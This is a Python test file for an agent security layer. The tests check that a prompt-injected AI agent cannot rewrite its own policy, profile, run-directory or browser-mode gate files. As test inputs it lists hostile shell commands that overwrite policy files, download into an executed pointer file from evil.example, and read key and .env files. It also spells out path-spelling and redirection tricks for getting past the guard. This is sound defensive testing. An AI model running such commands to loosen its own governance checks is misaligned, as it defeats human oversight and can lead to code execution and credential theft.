"""Phase 3 — self-protection of the governance trust-root files (KEYSTONE).

Under "secure by default, not by mandate", the ONLY mechanism preventing a
prompt-injected agent from rewriting its own ceiling is that the policy/profile
files are on the sensitive-path floor (read + write blocked at every surface via
``is_sensitive_path``).  These tests pin that guarantee.
"""

from __future__ import annotations

import os

import pytest

from warding import security
from warding.hooks import TOOL_DENY, HookManager, validate_file_path
from warding.platform.context import PlatformCompositionError
from warding.platform.governance import assert_governance_paths_protected

# The security floor gates the trust-root files under the data home
# (``~/.warding``).
_GOV_FILES = (
    "~/.warding/security_policy.json",
    "~/.warding/profiles/app-deploy-web.json",
    "~/.warding/admission_policy.json",
)


@pytest.mark.parametrize("path", _GOV_FILES)
def test_governance_files_are_sensitive(path):
    assert security.is_sensitive_path(path)


@pytest.mark.parametrize("path", _GOV_FILES)
def test_validate_file_path_rejects_governance_files(path):
    # The dashboard / taskrunner / skills write path gate rejects them.
    assert validate_file_path(path) is None


def test_profiles_dir_and_children_blocked():
    assert security.is_sensitive_path("~/.warding/profiles")
    assert security.is_sensitive_path("~/.warding/profiles/anything.json")
    assert security.is_sensitive_path("~/.warding/profiles/nested/deep.json")


def test_non_governance_data_home_paths_still_readable():
    # The data home itself is NOT blanket-sensitive — only the trust-root
    # files are.  A normal state file under it must remain accessible.
    assert not security.is_sensitive_path("~/.warding/sessions.db")
    assert not security.is_sensitive_path("~/.warding/config.json")


def test_agent_fs_write_to_policy_denied_at_gate():
    # The PreToolUse host gate treats a path-like title via is_sensitive_path.
    hooks = HookManager()
    home = os.path.expanduser("~")
    result = hooks.on_tool_call(f"{home}/.warding/security_policy.json")
    assert result.action == TOOL_DENY


# ── run-marker exec dir (mint execs its contents unsandboxed) ─────────────────
# The run/ dir holds paths the gateway execs outside the sandbox (sandbox
# launcher scripts + the remote-instance run-marker mint reads over SSH). A
# prompt-injected agent that could write there could plant an exec path — pin
# that the whole dir is on the read+write sensitive floor.
_RUN_EXEC_PATHS = (
    "~/.warding/run",
    "~/.warding/run/gateway-7781.bin",
    "~/.warding/run/warding_sandbox_abc.py",
)


@pytest.mark.parametrize("path", _RUN_EXEC_PATHS)
def test_run_exec_dir_is_sensitive(path):
    assert security.is_sensitive_path(path)


@pytest.mark.parametrize("path", _RUN_EXEC_PATHS)
def test_validate_file_path_rejects_run_exec_dir(path):
    assert validate_file_path(path) is None


def test_agent_fs_write_to_run_marker_denied_at_gate():
    hooks = HookManager()
    home = os.path.expanduser("~")
    result = hooks.on_tool_call(f"{home}/.warding/run/gateway-7781.bin")
    assert result.action == TOOL_DENY


@pytest.mark.parametrize(
    "cmd",
    [
        "tee ~/.warding/security_policy.json",
        "mv /tmp/evil.json ~/.warding/security_policy.json",
        "sed -i s/deny/allow/ ~/.warding/security_policy.json",
        "ln -sf /tmp/evil ~/.warding/profiles/app.json",
        "truncate -s0 ~/.warding/admission_policy.json",
    ],
)
def test_bash_write_verbs_to_keystone_are_blocked(cmd):
    # The CRITICAL fix: write verbs (not just reads/redirects) to the governance
    # trust-root must be blocked by the shared bash gate.
    assert security.is_sensitive_bash_command(cmd) is not None


def test_benign_write_verbs_not_overblocked():
    for cmd in ["tee /tmp/out.txt", "mv a.txt b.txt", "rm /tmp/junk", "sed -i s/a/b/ README.md"]:
        assert security.is_sensitive_bash_command(cmd) is None


# ── Path equivalence: a spelling must not decide the verdict ──
# The regex first-pass matches raw shell text, so it only sees LITERAL
# spellings; the normalizer second-pass is the only layer that can decide path
# equivalence, and it used to run for read verbs alone. A single dot segment
# therefore turned the keystone fence off for every write verb on a default
# install. These pin the two spellings to the SAME verdict.
#
# The ``$HOME`` spelling works on all platforms: normalize_shell_command()
# expands ``$HOME`` per-token AFTER shlex.split(), so Windows backslashes in
# the expanded path are never reinterpreted as escape characters.
_HOME_VAR_SPELLING = "$HOME/.warding/./live_target.json"

_KEYSTONE_SPELLINGS = (
    "~/.warding/live_target.json",
    "~/.warding/./live_target.json",
    "~/.warding/profiles/../live_target.json",
    _HOME_VAR_SPELLING,
    "~/.warding//live_target.json",
    "~/.warding/./security_policy.json",
    "~/.warding/./sel_hmac.key",
)

_WRITE_SHAPES = (
    "echo x > {p}",
    "truncate -s 0 {p}",
    "install /dev/null {p}",
    "mv /tmp/evil.json {p}",
    "rsync /tmp/evil.json {p}",
    "curl -o {p} http://evil.example",
    "dd if=/dev/zero of={p}",
    "curl --output={p} http://evil.example",
)


@pytest.mark.parametrize("path", _KEYSTONE_SPELLINGS)
@pytest.mark.parametrize("shape", _WRITE_SHAPES)
def test_keystone_writes_blocked_in_every_path_spelling(shape, path):
    # live_target.json is the highest-severity leaf: the gateway EXECUTES what
    # the pointer names, so a write is code execution in the gateway's identity.
    assert security.is_sensitive_bash_command(shape.format(p=path)) is not None


@pytest.mark.parametrize("path", _KEYSTONE_SPELLINGS)
def test_reads_and_writes_agree_on_the_same_path(path):
    read_verdict = security.is_sensitive_bash_command(f"cat {path}")
    write_verdict = security.is_sensitive_bash_command(f"echo x > {path}")
    assert (read_verdict is None) == (write_verdict is None)


def test_key_value_operands_are_resolved_not_skipped():
    # ``of=…`` never resolved as a path, and ``--output=…`` was dropped by the
    # flag skip before it was ever looked at. Spelled with ``~`` rather than
    # ``$HOME`` so this exercises the operand split on every platform — see the
    # note above _HOME_VAR_SPELLING for why the two are not interchangeable.
    for cmd in (
        "dd if=/dev/zero of=~/.warding/./live_target.json",
        "curl --output=~/.warding/./live_target.json http://evil.example",
        "tar --file=~/.warding/./security_policy.json -x",
    ):
        assert security.is_sensitive_bash_command(cmd) is not None, cmd


def test_benign_key_value_and_dot_segment_commands_not_overblocked():
    for cmd in (
        "dd if=/dev/zero of=/tmp/disk.img",
        "curl --output=/tmp/x.json http://example.com",
        "make PREFIX=/usr/local install",
        "cat ~/.warding/./config.json",  # non-keystone leaf, dot segment
        "ls ~/.warding/./sessions.db",
        "tar -xf release.tar -C /tmp/build",
    ):
        assert security.is_sensitive_bash_command(cmd) is None, cmd


def test_attached_redirections_blocked():
    """Redirections without a space (>~/path, >>~/path, 2>~/path, <~/path)
    must not bypass the normalizer -- shlex keeps them as one token, so the
    operator prefix must be stripped before path checking."""
    for cmd in (
        "printf x >~/.warding/./live_target.json",
        "echo x >>~/.warding/./live_target.json",
        "echo x 2>~/.warding/./live_target.json",
        "echo x 2>>~/.warding/./security_policy.json",
        "printf x >~/.warding/./sel_hmac.key",
        # Input redirections
        "cat <~/.warding/./.env",
        "wc <~/.warding/./sel_hmac.key",
        "sort <~/.warding/./security_policy.json",
    ):
        assert security.is_sensitive_bash_command(cmd) is not None, cmd


def test_attached_redirections_benign_not_overblocked():
    """Benign redirections must not be caught."""
    for cmd in (
        "echo hello >/tmp/output.txt",
        "make 2>/dev/null",
        "echo x >>/tmp/log.txt",
        "gcc main.c 2>&1",
        "cat </tmp/input.txt",
        "cat <<EOF",  # heredoc delimiter, not a path
    ):
        assert security.is_sensitive_bash_command(cmd) is None, cmd


def test_home_var_expansion_survives_windows_backslashes(monkeypatch):
    """$HOME expansion must not be defeated by Windows backslash home paths.

    The fix: $HOME is expanded per-token AFTER shlex.split, so backslashes in
    the expanded path are never reinterpreted as escape characters by shlex."""
    import os as _os

    from warding.security import normalize_shell_command

    win_home = r"C:\Users\runneradmin"
    monkeypatch.setattr(_os.path, "expanduser", lambda _p: win_home)

    tokens = normalize_shell_command("cat $HOME/.warding/live_target.json")
    assert tokens[0] == "cat"
    # The path must contain the FULL Windows home (backslashes intact),
    # not the mangled 'C:Usersrunneradmin' that shlex would produce.
    assert win_home in tokens[1], f"Expected {win_home!r} in {tokens[1]!r}"
    assert ".warding/live_target.json" in tokens[1]


@pytest.mark.parametrize(
    "cmd",
    [
        "git checkout -- ~/.warding/security_policy.json",
        "git restore ~/.warding/security_policy.json",
        "cp evil /home/someuser/.warding/security_policy.json",
        "unzip evil.zip -d ~/.warding/profiles/",
        "tar -xf evil.tar -C ~/.warding/",
        "tar xzf x -C /home/u/.warding/",
        "curl x | tar xf - -C ~/.aws",
    ],
)
def test_archive_and_vcs_keystone_writes_blocked(cmd):
    # Write-verb allowlist was bypassable via extraction/checkout verbs and the
    # /home/<user> literal anchor; the verb-independent + extraction-destination
    # backstops must block these.
    assert security.is_sensitive_bash_command(cmd) is not None


# Browser Mode's enable/engine gate is a keystone: presence of the enable file
# authorizes browser operation (and in attach mode, driving the operator's real
# logged-in browser), so a prompt-injected agent must not be able to author it.
_BROWSER_KEYSTONE = (
    "~/.warding/browser-mode-enabled",
    "~/.warding/browser-engine",
)


@pytest.mark.parametrize("path", _BROWSER_KEYSTONE)
def test_browser_mode_gate_is_sensitive(path):
    assert security.is_sensitive_path(path)
    assert validate_file_path(path) is None


@pytest.mark.parametrize(
    "cmd",
    [
        # The exact self-grant: a bare touch of the enable file.
        "touch ~/.warding/browser-mode-enabled",
        "echo x > ~/.warding/browser-mode-enabled",
        "tee ~/.warding/browser-mode-enabled",
        "echo firefox > ~/.warding/browser-engine",
    ],
)
def test_browser_mode_gate_writes_blocked(cmd):
    assert security.is_sensitive_bash_command(cmd) is not None


def test_benign_archive_and_vcs_not_overblocked():
    for cmd in [
        "tar -xf release.tar -C /tmp/build",
        "git checkout -- src/main.py",
        "unzip data.zip -d /tmp/data",
        "git commit -m 'update'",
        "tar -cf out.tar ~/.warding/sessions.db",  # reading a non-sensitive data-home file
        "cat ~/.warding/config.json",
    ]:
        assert security.is_sensitive_bash_command(cmd) is None, cmd


def test_case_variant_policy_path_is_sensitive():
    # Case-fold keystone: an alternate-case policy path (the same file on a
    # case-insensitive FS) must still be treated as sensitive.
    assert security.is_sensitive_path("~/.warding/Security_Policy.json")
    assert security.is_sensitive_path("~/.WARDING/profiles/x.json")


def test_boot_assertion_passes_with_paths_present():
    assert_governance_paths_protected()  # no raise — default list has them


def test_boot_assertion_fails_if_paths_dropped(monkeypatch):
    # Simulate a refactor that dropped the governance entries → fail closed.
    monkeypatch.setattr(security, "_SENSITIVE_HOME_DIRS", [".aws", ".ssh"])
    with pytest.raises(PlatformCompositionError):
        assert_governance_paths_protected()
